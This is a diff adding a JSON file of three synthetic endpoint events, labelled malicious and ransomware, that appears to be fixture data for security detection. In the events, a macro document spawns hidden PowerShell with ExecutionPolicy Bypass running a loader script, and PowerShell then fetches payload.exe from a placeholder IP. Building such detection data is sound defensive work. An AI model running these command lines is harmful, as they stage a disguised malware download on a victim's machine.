@@ -1,0 +1,149 @@
+[
+  {
+    "time": "2026-04-16T09:15:00Z",
+    "activity_name": "Process Launch",
+    "class_name": "Process Activity",
+    "category_name": "System Activity",
+    "severity": "medium",
+    "status": "success",
+    "metadata": {
+      "product_name": "synthetic-generator",
+      "version": "0.1.0",
+      "source_name": "synthetic-scenario",
+      "source_event_id": "scenario-bundle--malicious-001:event--001:1"
+    },
+    "device": {
+      "hostname": "finance-laptop-01",
+      "os": {
+        "name": "Windows 11"
+      }
+    },
+    "actor": {
+      "user": {
+        "name": "Alice"
+      },
+      "process": {
+        "name": "winword.exe",
+        "pid": 4000,
+        "command_line": "C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE C:/Users/Alice/Downloads/invoice.docm"
+      }
+    },
+    "process": {
+      "parent_process": {
+        "name": "explorer.exe",
+        "pid": 4001
+      }
+    },
+    "file": null,
+    "network": null,
+    "labels": [
+      "synthetic",
+      "malicious",
+      "ransomware",
+      "windows-endpoint"
+    ],
+    "scenario": {
+      "scenario_id": "scenario-bundle--malicious-001",
+      "stage": "pre-impact"
+    },
+    "event_type": "process_create"
+  },
+  {
+    "time": "2026-04-16T09:15:03Z",
+    "activity_name": "Process Launch",
+    "class_name": "Process Activity",
+    "category_name": "System Activity",
+    "severity": "medium",
+    "status": "success",
+    "metadata": {
+      "product_name": "synthetic-generator",
+      "version": "0.1.0",
+      "source_name": "synthetic-scenario",
+      "source_event_id": "scenario-bundle--malicious-001:event--002:2"
+    },
+    "device": {
+      "hostname": "finance-laptop-01",
+      "os": {
+        "name": "Windows 11"
+      }
+    },
+    "actor": {
+      "user": {
+        "name": "Alice"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "pid": 4002,
+        "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:/Users/Alice/AppData/Local/Temp/loader.ps1"
+      }
+    },
+    "process": {
+      "parent_process": {
+        "name": "winword.exe",
+        "pid": 4000
+      }
+    },
+    "file": null,
+    "network": null,
+    "labels": [
+      "synthetic",
+      "malicious",
+      "ransomware",
+      "windows-endpoint"
+    ],
+    "scenario": {
+      "scenario_id": "scenario-bundle--malicious-001",
+      "stage": "pre-impact"
+    },
+    "event_type": "process_create"
+  },
+  {
+    "time": "2026-04-16T09:15:07Z",
+    "activity_name": "Command Execution",
+    "class_name": "Process Activity",
+    "category_name": "System Activity",
+    "severity": "medium",
+    "status": "success",
+    "metadata": {
+      "product_name": "synthetic-generator",
+      "version": "0.1.0",
+      "source_name": "synthetic-scenario",
+      "source_event_id": "scenario-bundle--malicious-001:event--003:3"
+    },
+    "device": {
+      "hostname": "finance-laptop-01",
+      "os": {
+        "name": "Windows 11"
+      }
+    },
+    "actor": {
+      "user": {
+        "name": "Alice"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "pid": 4002,
+        "command_line": "Invoke-WebRequest http://198.51.100.10/payload.exe -OutFile C:/Users/Alice/AppData/Local/Temp/payload.exe"
+      }
+    },
+    "process": {
+      "parent_process": {
+        "name": "winword.exe",
+        "pid": 4000
+      }
+    },
+    "file": null,
+    "network": null,
+    "labels": [
+      "synthetic",
+      "malicious",
+      "ransomware",
+      "windows-endpoint"
+    ],
+    "scenario": {
+      "scenario_id": "scenario-bundle--malicious-001",
+      "stage": "pre-impact"
+    },
+    "event_type": "command_exec"
+  }
+]
